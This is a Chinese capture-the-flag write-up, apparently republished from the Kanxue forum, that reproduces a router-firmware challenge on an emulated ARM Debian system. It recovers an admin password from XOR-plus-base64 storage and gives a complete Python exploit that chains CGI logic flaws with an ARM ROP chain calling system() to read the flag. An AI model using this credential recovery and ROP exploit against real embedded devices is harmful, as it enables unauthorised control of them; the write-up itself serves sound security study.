# 第八届强网拟态防御国际精英挑战赛 – WIN！致敬mt 复现

> 原文: https://www.ctfiot.com/283883.html
> ID: 283883

1

漏洞分析

root@debian-armel:/#ps-efUID PIDPPIDCSTIMETTY TIMECMDroot 1 00Oct27? 00:00:00init[2] root 2 00Oct27? 00:00:00[kthreadd]root 3 20Oct27? 00:00:00[ksoftirqd/0]root 5 20Oct27? 00:00:00[kworker/u:0]root 6 20Oct27? 00:00:00[watchdog/0]root 7 20Oct27? 00:00:00[cpuset]root 8 20Oct27? 00:00:00[khelper]root 9 20Oct27? 00:00:00[kdevtmpfs]root 10 20Oct27? 00:00:00[netns]root 11 20Oct27? 00:00:00[sync_supers]root 12 20Oct27? 00:00:00[bdi-default]root 13 20Oct27? 00:00:00[kintegrityd]root 14 20Oct27? 00:00:00[kblockd]root 15 20Oct27? 00:00:00[khungtaskd]root 16 20Oct27? 00:00:00[kswapd0]root 17 20Oct27? 00:00:00[ksmd]root 18 20Oct27? 00:00:00[fsnotify_mark]root 19 20Oct27? 00:00:00[crypto]root 67 20Oct27? 00:00:00[scsi_eh_0]root 110 20Oct27? 00:00:00[kworker/u:1]root 127 20Oct27? 00:00:00[jbd2/sda1-8]root 128 20Oct27? 00:00:00[ext4-dio-unwrit]root 275 10Oct27? 00:00:00udevd--daemonroot 313 2750Oct27? 00:00:00udevd--daemonroot 314 2750Oct27? 00:00:00udevd--daemonroot 331 20Oct27? 00:00:00[kpsmoused]root 1507 10Oct27? 00:00:00/sbin/rpcbind-wstatd 1538 10Oct27? 00:00:00/sbin/rpc.statdroot 1543 20Oct27? 00:00:00[rpciod]root 1545 20Oct27? 00:00:00[nfsiod]root 1552 10Oct27? 00:00:00/usr/sbin/rpc.idmapdroot 1706 10Oct27? 00:00:00dhclient-v-pf/run/dhclient.eth0.pid-lf/var/lib/dhcp/dhclient.eth0.leaseseth0root 1853 10Oct27? 00:00:00/usr/sbin/rsyslogd-c5daemon 1888 10Oct27? 00:00:00/usr/sbin/atdroot 1956 10Oct27? 00:00:00/usr/sbin/cronwww-data2226 10Oct27? 00:00:01/usr/sbin/lighttpd-f/etc/lighttpd/lighttpd.conf101 2237 10Oct27? 00:00:00/usr/sbin/exim4-bd-q30mroot 2277 10Oct27? 00:00:00/usr/sbin/sshdroot 2303 10Oct27tty1 00:00:00/sbin/getty38400tty1root 2304 10Oct27tty2 00:00:00/sbin/getty38400tty2root 2305 10Oct27tty3 00:00:00/sbin/getty38400tty3root 2306 10Oct27tty4 00:00:00/sbin/getty38400tty4root 2307 10Oct27tty5 00:00:00/sbin/getty38400tty5root 2308 10Oct27tty6 00:00:00/sbin/getty38400tty6root 2309 10Oct27ttyAMA000:00:00/bin/login-- root 2311 2309 0Oct27ttyAMA000:00:00-bashroot 2329 20Oct27? 00:00:00[kworker/0:0]root 2334 20Oct27? 00:00:00[flush-8:0]root 2379 20Oct27? 00:00:00[kworker/0:1]root 2417 2277 002:25? 00:00:00 sshd:root@pts/0root 2419 2417 002:25pts/0 00:00:00-bashroot 2449 2002:26? 00:00:00[kworker/0:2]root 2450 2419 002:26pts/0 00:00:00ps-efroot@debian-armel:/#netstat-nlapActiveInternetconnections(serversandestablished)ProtoRecv-QSend-QLocalAddress ForeignAddress State PID/Programnametcp 0 00.0.0.0:42959 0.0.0.0:* LISTEN 1538/rpc.statdtcp 0 00.0.0.0:111 0.0.0.0:* LISTEN 1507/rpcbind tcp 0 00.0.0.0:80 0.0.0.0:* LISTEN 2226/lighttpd tcp 0 00.0.0.0:22 0.0.0.0:* LISTEN 2277/sshd tcp 0 0127.0.0.1:25 0.0.0.0:* LISTEN 2237/exim4 tcp 0 010.0.2.15:22 10.0.2.2:50541 ESTABLISHED2417/0 tcp6 0 0:::111 :::* LISTEN 1507/rpcbind tcp6 0 0:::80 :::* LISTEN 2226/lighttpd tcp6 0 0:::22 :::* LISTEN 2277/sshd tcp6 0 0::1:25 :::* LISTEN 2237/exim4 tcp6 0 0:::44453 :::* LISTEN 1538/rpc.statdudp 0 00.0.0.0:832 0.0.0.0:* 1507/rpcbind udp 0 00.0.0.0:68 0.0.0.0:* 1706/dhclient udp 0 0127.0.0.1:866 0.0.0.0:* 1538/rpc.statdudp 0 00.0.0.0:111 0.0.0.0:* 1507/rpcbind udp 0 00.0.0.0:39799 0.0.0.0:* 1538/rpc.statdudp 0 00.0.0.0:8391 0.0.0.0:* 1706/dhclient udp6 0 0:::6690 :::* 1706/dhclient udp6 0 0:::832 :::* 1507/rpcbind udp6 0 0:::45389 :::* 1538/rpc.statdudp6 0 0:::111 :::* 1507/rpcbind ActiveUNIXdomainsockets(serversandestablished)ProtoRefCntFlags Type State I-Node PID/Programname Pathunix2 [ACC] STREAM LISTENING 3623 1507/rpcbind /var/run/rpcbind.sockunix5 [ ] DGRAM 4010 1853/rsyslogd /dev/logunix2 [ACC] SEQPACKETLISTENING 2284 275/udevd /run/udev/controlunix2 [ ] DGRAM 5034 2417/0 unix2 [ ] DGRAM 4602 1706/dhclient unix2 [ ] DGRAM 4381 2309/login unix3 [ ] STREAM CONNECTED 3741 1552/rpc.idmapd unix3 [ ] STREAM CONNECTED 3740 1552/rpc.idmapd unix3 [ ] DGRAM 2291 275/udevd unix3 [ ] DGRAM 2290 275/udevd

root@debian-armel:~# cat /etc/lighttpd/lighttpd.confserver.modules = ("mod_access","mod_alias","mod_compress","mod_redirect",# "mod_rewrite",)server.document-root ="/var/www"server.upload-dirs = ("/var/cache/lighttpd/uploads")server.errorlog ="/var/log/lighttpd/error.log"server.pid-file ="/var/run/lighttpd.pid"server.username ="www-data"server.groupname ="www-data"server.port =80index-file.names = ("index.php","index.html","index.lighttpd.html")url.access-deny = ("~",".inc")static-file.exclude-extensions = (".php",".pl",".fcgi")compress.cache-dir ="/var/cache/lighttpd/compress/"compress.filetype = ("application/javascript","text/css","text/html","text/plain")# 加载设置响应头的模块server.modules += ("mod_setenv")# 彻底禁用ETag（否则客户端会继续带 If-None-Match）etag.use-inode ="disable"etag.use-mtime ="disable"etag.use-size ="disable"# 对常见静态资源直接禁用缓存$HTTP["url"] =~".(html|css|js|png|jpg|gif)$"{ setenv.add-response-header += ("Cache-Control"=>"no-store, no-cache, must-revalidate","Pragma" =>"no-cache","Expires" =>"0" )}# default listening port for IPv6 falls back to the IPv4 portinclude_shell"/usr/share/lighttpd/use-ipv6.pl "+ server.portinclude_shell"/usr/share/lighttpd/create-mime.assign.pl"include_shell"/usr/share/lighttpd/include-conf-enabled.pl"

sudo qemu-system-arm -M versatilepb -m256 -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append"root=/dev/sda1 console=ttyAMA0" -net nic -net user,hostfwd=tcp::1337-:80,hostfwd=tcp::1338-:22,hostfwd=tcp::1234-:1234 -nographic

➜ binfile scp -r -P1338root@127.0.0.1:/var/www/cgi-bin./➜ binfile scp -P1338root@127.0.0.1:/usr/sbin/lighttpd./➜ binfile tree ./ -L2 ./├── cgi-bin│ ├── auth.cgi│ ├── lang.cgi│ ├── manage.cgi│ ├── session_check.cgi│ ├── upload.cgi│ └── watch└── lighttpd2directories,7files

root@debian-armel:/var/www/cgi-bin# cat /tmp/store/users.txtadmin:dlZ4bWFsdjUDaiYCeCUqfGYUEhBvFW97dmtxcA==

memset(input_enc_passwd,0,sizeof(input_enc_passwd)); passwd_len = strlen(passwd); passwd_memory = malloc(passwd_len);if( !passwd_memory )gotoLABEL_107;if( passwd_len >0) {do { passwd_memory[idx] = xor_key[idx %10] ^ passwd[idx];// xor ++idx; }while( passwd_len != idx ); idx =0; input_enc_passwd_ = input_enc_passwd; idx_ =0;while(1) { v70 = passwd_memory[idx_];if( passwd_len > idx_ +1) { v57 = passwd_memory[idx_ +1];if( passwd_len <= idx_ +2) { LOBYTE(v58) =0; v59 = (16* (v70 &3)) | (v57 >>4); idx_ +=2; v60 = v70 >>2; v61 =4* (v57 &0xF); v63 =0; v62 =0; }else { v58 = passwd_memory[idx_ +2]; v59 = (16* (v70 &3)) | (v57 >>4); idx_ +=3; v60 = v70 >>2; v61 =4* (v57 &0xF); v62 = v58 >>6; v63 =1; } v64 = v62 | v61;if( v63 ) { v65 = v58 &0x3F; v66 =1; }else { v66 =1; v65 =0; } }else { v66 =0; v71 = v70 &3; ++idx_; v60 = v70 >>2; v59 =16* v71; v64 =0; v63 =0; v65 =0; }if( idx =='x03xFC')break; v67 = aAbcdefghijklmn[v59]; input_enc_passwd[idx] = aAbcdefghijklmn[v60]; input_enc_passwd_[1] = v67;if( v66 ) v68 = aAbcdefghijklmn[v64];else v68 =61; input_enc_passwd_[2] = v68;if( v63 ) v69 = aAbcdefghijklmn[v65];else v69 =61; input_enc_passwd_[3] = v69; idx +=4; input_enc_passwd_ +=4;if( passwd_len <= idx_ )gotoLABEL_94; } free(passwd_memory);LABEL_107: output("Internal error.");return0; }LABEL_94: input_enc_passwd[idx] =0; free(passwd_memory);

import base64defxor_bytes(data: bytes, key: bytes) -> bytes: k =len(key) returnbytes(b ^ key[i % k] for i, b inenumerate(data))defdecrypt_from_b64(b64_str: str, key: bytes) -> bytes: enc = base64.b64decode(b64_str) returnxor_bytes(enc, key)defencrypt_to_b64(plain: bytes, key: bytes) -> str: enc =xor_bytes(plain, key) return base64.b64encode(enc).decode()if __name__ =="__main__": target_str ="dlZ4bWFsdjUDaiYCeCUqfGYUEhBvFW97dmtxcA==" xor_key = b"N1K_ROUT3R" recovered =decrypt_from_b64(target_str, xor_key) # 常见固件里会有结尾0字节，可按需去掉 recovered_str = recovered.rstrip(b"x00")print("raw bytes:", recovered) try:print("utf-8:", recovered_str.decode("utf-8")) except UnicodeDecodeError: pass

➜ binfile python3 decode_passwd.pyrawbytes:b'8g323##a08h33zx33@!B!$$$$$$$'utf-8: 8g323##a08h33zx33@!B!$$$$$$$

root@debian-armel:/var/www# ls /tmp/store

root@debian-armel:/var/www/cgi-bin# grep-r rootkey ./Binaryfile ./watchmatchesBinaryfile ./manage.cgimatches

2

exploit

frompwnimport*importrequestsfromurllib.parseimportquote_plusimportreimportasynciomysession =Nonemysid =Nonebase_url ="http://127.0.0.1:8800"headers = {"Host":"127.0.0.1:8800","sec-ch-ua":'"Chromium";v="140", "Not=A?Brand";v="24", "Microsoft Edge";v="140"',"sec-ch-ua-mobile":"?0","sec-ch-ua-platform":'"macOS"',"Upgrade-Insecure-Requests":"1","Origin":"http://127.0.0.1:8800","Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"navigate","Sec-Fetch-User":"?1","Sec-Fetch-Dest":"document","Referer":"http://127.0.0.1:8800/","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9","Connection":"close"}defset_session_cookies():ifmysid: mysession.cookies.set("SID", mysid) mysession.cookies.set("mitmproxy-auth",'2|1:0|10:1745484849|14:mitmproxy-auth|4:eQ==|''bcade3a9f1b37c48d9c3d670a0d91c2524f01452c91ba02f80c059c1a5c1b0a5' )else:print("[-] 未设置 SID") exit(1)defsend_post(url, data): set_session_cookies() resp = mysession.post(base_url + url, headers=headers, data=data)returnresp.textdefsend_get(url, params): set_session_cookies() resp = mysession.get(base_url + url, headers=headers, params=params)returnresp.textdeflogin(username="admin", password="8g323##a08h33zx33@!B!$$$$$$$"):globalmysession, mysid url ="/cgi-bin/auth.cgi" mysession = requests.Session() data =f"username={quote_plus(username)}&password={quote_plus(password)}" resp = mysession.post(base_url + url, headers=headers, data=data, allow_redirects=False) mysid = mysession.cookies.get("SID")ifnotmysid:print("[-] 登录失败，未获取到 SID") mysession =NonereturnFalseprint(f"[+] 登录成功，SID ={mysid}")returnTruedefupload(data):returnsend_post("/cgi-bin/upload.cgi", data)defmanage(params):returnsend_get("/cgi-bin/manage.cgi", params)defcreate_rootkey():returnsend_get("/cgi-bin/watch", {})defset_id(params):print("[+] setid saved: "+str(params["setid"]))returnsend_get("/cgi-bin/lang.cgi", params)defmake_rop():# '''# 0x00015b24: pop {lr}; bx lr;# 0x0010c730: pop {r0, lr}; bx lr;# ''' libc =0xb6e8f000 pop_lr =0x00015b24+ libc pop_r0_lr =0x0010c730+ libc system =0x38d34+ libc shm_addr =0xb6ffc000 args_addr = shm_addr +0x24+0x4* (3+1) cmd ="cat /home/ctf/flag > /tmp/store/logs.txt" rop =b'a'*0x24+ p32(pop_lr) rop += p32(pop_r0_lr) + p32(args_addr) + p32(system) rop += cmd rop +=b'x00' pk_prefix ="00"*80foridx, valinenumerate(rop): byte_hex =f"{val:02x}" pk_content = pk_prefix + byte_hex *2print(f"[+] set payload_store[{idx}] = 0x{byte_hex}") payload = {"action":"upload_pubkey","filecontent": pk_content, } upload(payload) params = {"action":"set_publicfile","cnt1":80,"cnt2": idx, } manage(params)defredirect_flag_to_log(): create_rootkey() suffix ="nik.gif" need_to_minus =len("/tmp/"+"rootkey") +1 file_path ="./"* ((0x60-need_to_minus)//2) +"/"+"rootkey"+ suffix# print(hex((need_to_minus)))# print(hex(len(file_path))) payload = {"action":"download","path": file_path, } rootkey = upload(payload)print("[+] rootkey: "+ rootkey) payload = {"setid":"-1", } set_id(payload) make_rop() payload = {"action":"manage","rk": rootkey, } manage(payload)defget_flag(): payload = {"action":"logs", } flag = manage(payload)print("[+] ", flag)login()redirect_flag_to_log()get_flag()

login()redirect_flag_to_log()

login()get_flag()

看雪ID：flyyyy

https://bbs.kanxue.com/user-home-971428.htm

*本文为看雪论坛精华文章，由flyyyy原创，转载请注明来自看雪社区

# 往期推荐

V8 Bytecode反汇编/反编译不完全指南

静态程序分析之数据流分析(Foundations + LiveVar Analysis Code)续

tt x-gorgon分析

基于Minifilter实现目录保护软件，自定义保护目录，用户可选择是否允许文件行为

一道简单的RE迷宫题

球分享

球点赞

球在看

点击阅读原文查看更多


```
root@debian-armel:/#ps-efUID PIDPPIDCSTIMETTY TIMECMDroot 1 00Oct27? 00:00:00init[2] root 2 00Oct27? 00:00:00[kthreadd]root 3 20Oct27? 00:00:00[ksoftirqd/0]root 5 20Oct27? 00:00:00[kworker/u:0]root 6 20Oct27? 00:00:00[watchdog/0]root 7 20Oct27? 00:00:00[cpuset]root 8 20Oct27? 00:00:00[khelper]root 9 20Oct27? 00:00:00[kdevtmpfs]root 10 20Oct27? 00:00:00[netns]root 11 20Oct27? 00:00:00[sync_supers]root 12 20Oct27? 00:00:00[bdi-default]root 13 20Oct27? 00:00:00[kintegrityd]root 14 20Oct27? 00:00:00[kblockd]root 15 20Oct27? 00:00:00[khungtaskd]root 16 20Oct27? 00:00:00[kswapd0]root 17 20Oct27? 00:00:00[ksmd]root 18 20Oct27? 00:00:00[fsnotify_mark]root 19 20Oct27? 00:00:00[crypto]root 67 20Oct27? 00:00:00[scsi_eh_0]root 110 20Oct27? 00:00:00[kworker/u:1]root 127 20Oct27? 00:00:00[jbd2/sda1-8]root 128 20Oct27? 00:00:00[ext4-dio-unwrit]root 275 10Oct27? 00:00:00udevd--daemonroot 313 2750Oct27? 00:00:00udevd--daemonroot 314 2750Oct27? 00:00:00udevd--daemonroot 331 20Oct27? 00:00:00[kpsmoused]root 1507 10Oct27? 00:00:00/sbin/rpcbind-wstatd 1538 10Oct27? 00:00:00/sbin/rpc.statdroot 1543 20Oct27? 00:00:00[rpciod]root 1545 20Oct27? 00:00:00[nfsiod]root 1552 10Oct27? 00:00:00/usr/sbin/rpc.idmapdroot 1706 10Oct27? 00:00:00dhclient-v-pf/run/dhclient.eth0.pid-lf/var/lib/dhcp/dhclient.eth0.leaseseth0root 1853 10Oct27? 00:00:00/usr/sbin/rsyslogd-c5daemon 1888 10Oct27? 00:00:00/usr/sbin/atdroot 1956 10Oct27? 00:00:00/usr/sbin/cronwww-data2226 10Oct27? 00:00:01/usr/sbin/lighttpd-f/etc/lighttpd/lighttpd.conf101 2237 10Oct27? 00:00:00/usr/sbin/exim4-bd-q30mroot 2277 10Oct27? 00:00:00/usr/sbin/sshdroot 2303 10Oct27tty1 00:00:00/sbin/getty38400tty1root 2304 10Oct27tty2 00:00:00/sbin/getty38400tty2root 2305 10Oct27tty3 00:00:00/sbin/getty38400tty3root 2306 10Oct27tty4 00:00:00/sbin/getty38400tty4root 2307 10Oct27tty5 00:00:00/sbin/getty38400tty5root 2308 10Oct27tty6 00:00:00/sbin/getty38400tty6root 2309 10Oct27ttyAMA000:00:00/bin/login-- root 2311 2309 0Oct27ttyAMA000:00:00-bashroot 2329 20Oct27? 00:00:00[kworker/0:0]root 2334 20Oct27? 00:00:00[flush-8:0]root 2379 20Oct27? 00:00:00[kworker/0:1]root 2417 2277 002:25? 00:00:00 sshd:root@pts/0root 2419 2417 002:25pts/0 00:00:00-bashroot 2449 2002:26? 00:00:00[kworker/0:2]root 2450 2419 002:26pts/0 00:00:00ps-efroot@debian-armel:/#netstat-nlapActiveInternetconnections(serversandestablished)ProtoRecv-QSend-QLocalAddress ForeignAddress State PID/Programnametcp 0 00.0.0.0:42959 0.0.0.0:* LISTEN 1538/rpc.statdtcp 0 00.0.0.0:111 0.0.0.0:* LISTEN 1507/rpcbind tcp 0 00.0.0.0:80 0.0.0.0:* LISTEN 2226/lighttpd tcp 0 00.0.0.0:22 0.0.0.0:* LISTEN 2277/sshd tcp 0 0127.0.0.1:25 0.0.0.0:* LISTEN 2237/exim4 tcp 0 010.0.2.15:22 10.0.2.2:50541 ESTABLISHED2417/0 tcp6 0 0:::111 :::* LISTEN 1507/rpcbind tcp6 0 0:::80 :::* LISTEN 2226/lighttpd tcp6 0 0:::22 :::* LISTEN 2277/sshd tcp6 0 0::1:25 :::* LISTEN 2237/exim4 tcp6 0 0:::44453 :::* LISTEN 1538/rpc.statdudp 0 00.0.0.0:832 0.0.0.0:* 1507/rpcbind udp 0 00.0.0.0:68 0.0.0.0:* 1706/dhclient udp 0 0127.0.0.1:866 0.0.0.0:* 1538/rpc.statdudp 0 00.0.0.0:111 0.0.0.0:* 1507/rpcbind udp 0 00.0.0.0:39799 0.0.0.0:* 1538/rpc.statdudp 0 00.0.0.0:8391 0.0.0.0:* 1706/dhclient udp6 0 0:::6690 :::* 1706/dhclient udp6 0 0:::832 :::* 1507/rpcbind udp6 0 0:::45389 :::* 1538/rpc.statdudp6 0 0:::111 :::* 1507/rpcbind ActiveUNIXdomainsockets(serversandestablished)ProtoRefCntFlags Type State I-Node PID/Programname Pathunix2 [ACC] STREAM LISTENING 3623 1507/rpcbind /var/run/rpcbind.sockunix5 [ ] DGRAM 4010 1853/rsyslogd /dev/logunix2 [ACC] SEQPACKETLISTENING 2284 275/udevd /run/udev/controlunix2 [ ] DGRAM 5034 2417/0 unix2 [ ] DGRAM 4602 1706/dhclient unix2 [ ] DGRAM 4381 2309/login unix3 [ ] STREAM CONNECTED 3741 1552/rpc.idmapd unix3 [ ] STREAM CONNECTED 3740 1552/rpc.idmapd unix3 [ ] DGRAM 2291 275/udevd unix3 [ ] DGRAM 2290 275/udevd
```



```
root@debian-armel:~# cat /etc/lighttpd/lighttpd.confserver.modules = ("mod_access","mod_alias","mod_compress","mod_redirect",# "mod_rewrite",)server.document-root ="/var/www"server.upload-dirs = ("/var/cache/lighttpd/uploads")server.errorlog ="/var/log/lighttpd/error.log"server.pid-file ="/var/run/lighttpd.pid"server.username ="www-data"server.groupname ="www-data"server.port =80index-file.names = ("index.php","index.html","index.lighttpd.html")url.access-deny = ("~",".inc")static-file.exclude-extensions = (".php",".pl",".fcgi")compress.cache-dir ="/var/cache/lighttpd/compress/"compress.filetype = ("application/javascript","text/css","text/html","text/plain")# 加载设置响应头的模块server.modules += ("mod_setenv")# 彻底禁用ETag（否则客户端会继续带 If-None-Match）etag.use-inode ="disable"etag.use-mtime ="disable"etag.use-size ="disable"# 对常见静态资源直接禁用缓存$HTTP["url"] =~".(html|css|js|png|jpg|gif)$"{ setenv.add-response-header += ("Cache-Control"=>"no-store, no-cache, must-revalidate","Pragma" =>"no-cache","Expires" =>"0" )}# default listening port for IPv6 falls back to the IPv4 portinclude_shell"/usr/share/lighttpd/use-ipv6.pl "+ server.portinclude_shell"/usr/share/lighttpd/create-mime.assign.pl"include_shell"/usr/share/lighttpd/include-conf-enabled.pl"
```



```
sudo qemu-system-arm -M versatilepb -m256 -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append"root=/dev/sda1 console=ttyAMA0" -net nic -net user,hostfwd=tcp::1337-:80,hostfwd=tcp::1338-:22,hostfwd=tcp::1234-:1234 -nographic
```



```
➜ binfile scp -r -P1338root@127.0.0.1:/var/www/cgi-bin./➜ binfile scp -P1338root@127.0.0.1:/usr/sbin/lighttpd./➜ binfile tree ./ -L2 ./├── cgi-bin│ ├── auth.cgi│ ├── lang.cgi│ ├── manage.cgi│ ├── session_check.cgi│ ├── upload.cgi│ └── watch└── lighttpd2directories,7files
```



```
root@debian-armel:/var/www/cgi-bin# cat /tmp/store/users.txtadmin:dlZ4bWFsdjUDaiYCeCUqfGYUEhBvFW97dmtxcA==
```



```
memset(input_enc_passwd,0,sizeof(input_enc_passwd)); passwd_len = strlen(passwd); passwd_memory = malloc(passwd_len);if( !passwd_memory )gotoLABEL_107;if( passwd_len >0) {do { passwd_memory[idx] = xor_key[idx %10] ^ passwd[idx];// xor ++idx; }while( passwd_len != idx ); idx =0; input_enc_passwd_ = input_enc_passwd; idx_ =0;while(1) { v70 = passwd_memory[idx_];if( passwd_len > idx_ +1) { v57 = passwd_memory[idx_ +1];if( passwd_len <= idx_ +2) { LOBYTE(v58) =0; v59 = (16* (v70 &3)) | (v57 >>4); idx_ +=2; v60 = v70 >>2; v61 =4* (v57 &0xF); v63 =0; v62 =0; }else { v58 = passwd_memory[idx_ +2]; v59 = (16* (v70 &3)) | (v57 >>4); idx_ +=3; v60 = v70 >>2; v61 =4* (v57 &0xF); v62 = v58 >>6; v63 =1; } v64 = v62 | v61;if( v63 ) { v65 = v58 &0x3F; v66 =1; }else { v66 =1; v65 =0; } }else { v66 =0; v71 = v70 &3; ++idx_; v60 = v70 >>2; v59 =16* v71; v64 =0; v63 =0; v65 =0; }if( idx =='x03xFC')break; v67 = aAbcdefghijklmn[v59]; input_enc_passwd[idx] = aAbcdefghijklmn[v60]; input_enc_passwd_[1] = v67;if( v66 ) v68 = aAbcdefghijklmn[v64];else v68 =61; input_enc_passwd_[2] = v68;if( v63 ) v69 = aAbcdefghijklmn[v65];else v69 =61; input_enc_passwd_[3] = v69; idx +=4; input_enc_passwd_ +=4;if( passwd_len <= idx_ )gotoLABEL_94; } free(passwd_memory);LABEL_107: output("Internal error.");return0; }LABEL_94: input_enc_passwd[idx] =0; free(passwd_memory);
```



```
import base64defxor_bytes(data: bytes, key: bytes) -> bytes: k =len(key) returnbytes(b ^ key[i % k] for i, b inenumerate(data))defdecrypt_from_b64(b64_str: str, key: bytes) -> bytes: enc = base64.b64decode(b64_str) returnxor_bytes(enc, key)defencrypt_to_b64(plain: bytes, key: bytes) -> str: enc =xor_bytes(plain, key) return base64.b64encode(enc).decode()if __name__ =="__main__": target_str ="dlZ4bWFsdjUDaiYCeCUqfGYUEhBvFW97dmtxcA==" xor_key = b"N1K_ROUT3R" recovered =decrypt_from_b64(target_str, xor_key) # 常见固件里会有结尾0字节，可按需去掉 recovered_str = recovered.rstrip(b"x00")print("raw bytes:", recovered) try:print("utf-8:", recovered_str.decode("utf-8")) except UnicodeDecodeError: pass
```



```
➜ binfile python3 decode_passwd.pyrawbytes:b'8g323##a08h33zx33@!B!$$$$$$$'utf-8: 8g323##a08h33zx33@!B!$$$$$$$
```



```
root@debian-armel:/var/www# ls /tmp/store
```



```
root@debian-armel:/var/www/cgi-bin# grep-r rootkey ./Binaryfile ./watchmatchesBinaryfile ./manage.cgimatches
```



```
frompwnimport*importrequestsfromurllib.parseimportquote_plusimportreimportasynciomysession =Nonemysid =Nonebase_url ="http://127.0.0.1:8800"headers = {"Host":"127.0.0.1:8800","sec-ch-ua":'"Chromium";v="140", "Not=A?Brand";v="24", "Microsoft Edge";v="140"',"sec-ch-ua-mobile":"?0","sec-ch-ua-platform":'"macOS"',"Upgrade-Insecure-Requests":"1","Origin":"http://127.0.0.1:8800","Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"navigate","Sec-Fetch-User":"?1","Sec-Fetch-Dest":"document","Referer":"http://127.0.0.1:8800/","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9","Connection":"close"}defset_session_cookies():ifmysid: mysession.cookies.set("SID", mysid) mysession.cookies.set("mitmproxy-auth",'2|1:0|10:1745484849|14:mitmproxy-auth|4:eQ==|''bcade3a9f1b37c48d9c3d670a0d91c2524f01452c91ba02f80c059c1a5c1b0a5' )else:print("[-] 未设置 SID") exit(1)defsend_post(url, data): set_session_cookies() resp = mysession.post(base_url + url, headers=headers, data=data)returnresp.textdefsend_get(url, params): set_session_cookies() resp = mysession.get(base_url + url, headers=headers, params=params)returnresp.textdeflogin(username="admin", password="8g323##a08h33zx33@!B!$$$$$$$"):globalmysession, mysid url ="/cgi-bin/auth.cgi" mysession = requests.Session() data =f"username={quote_plus(username)}&password={quote_plus(password)}" resp = mysession.post(base_url + url, headers=headers, data=data, allow_redirects=False) mysid = mysession.cookies.get("SID")ifnotmysid:print("[-] 登录失败，未获取到 SID") mysession =NonereturnFalseprint(f"[+] 登录成功，SID ={mysid}")returnTruedefupload(data):returnsend_post("/cgi-bin/upload.cgi", data)defmanage(params):returnsend_get("/cgi-bin/manage.cgi", params)defcreate_rootkey():returnsend_get("/cgi-bin/watch", {})defset_id(params):print("[+] setid saved: "+str(params["setid"]))returnsend_get("/cgi-bin/lang.cgi", params)defmake_rop():# '''# 0x00015b24: pop {lr}; bx lr;# 0x0010c730: pop {r0, lr}; bx lr;# ''' libc =0xb6e8f000 pop_lr =0x00015b24+ libc pop_r0_lr =0x0010c730+ libc system =0x38d34+ libc shm_addr =0xb6ffc000 args_addr = shm_addr +0x24+0x4* (3+1) cmd ="cat /home/ctf/flag > /tmp/store/logs.txt" rop =b'a'*0x24+ p32(pop_lr) rop += p32(pop_r0_lr) + p32(args_addr) + p32(system) rop += cmd rop +=b'x00' pk_prefix ="00"*80foridx, valinenumerate(rop): byte_hex =f"{val:02x}" pk_content = pk_prefix + byte_hex *2print(f"[+] set payload_store[{idx}] = 0x{byte_hex}") payload = {"action":"upload_pubkey","filecontent": pk_content, } upload(payload) params = {"action":"set_publicfile","cnt1":80,"cnt2": idx, } manage(params)defredirect_flag_to_log(): create_rootkey() suffix ="nik.gif" need_to_minus =len("/tmp/"+"rootkey") +1 file_path ="./"* ((0x60-need_to_minus)//2) +"/"+"rootkey"+ suffix# print(hex((need_to_minus)))# print(hex(len(file_path))) payload = {"action":"download","path": file_path, } rootkey = upload(payload)print("[+] rootkey: "+ rootkey) payload = {"setid":"-1", } set_id(payload) make_rop() payload = {"action":"manage","rk": rootkey, } manage(payload)defget_flag(): payload = {"action":"logs", } flag = manage(payload)print("[+] ", flag)login()redirect_flag_to_log()get_flag()
```



```
login()redirect_flag_to_log()
```



```
login()get_flag()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1764203523-wxsync-2025-11-2fc075931f11969b3255906e1c646dac.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1764203524-wxsync-2025-11-a4af486eb1a20be81edfff9ad7b033a0.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1764203526-wxsync-2025-11-e30b6d553822506bfd8b55998124d40c.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1764203528-wxsync-2025-11-e453daa7b2efca667b093a6b03c7c674.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1764203535-wxsync-2025-11-33e1bb827756dbddd51cf9cf08e1515a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1764203536-wxsync-2025-11-a5d480e23fd05842f8d736be9f355e97.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1764203538-wxsync-2025-11-199f534f771a808265db350bc1abffe8.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1764203540-wxsync-2025-11-3e49c5e6454c31ccf0282c2db0741ec3.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1764203542-wxsync-2025-11-7903a3b3ead11f0425978cfc4802c07d.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/11/1764203543-wxsync-2025-11-5bb48a1b68d708e1924ab9586788fcbb.png)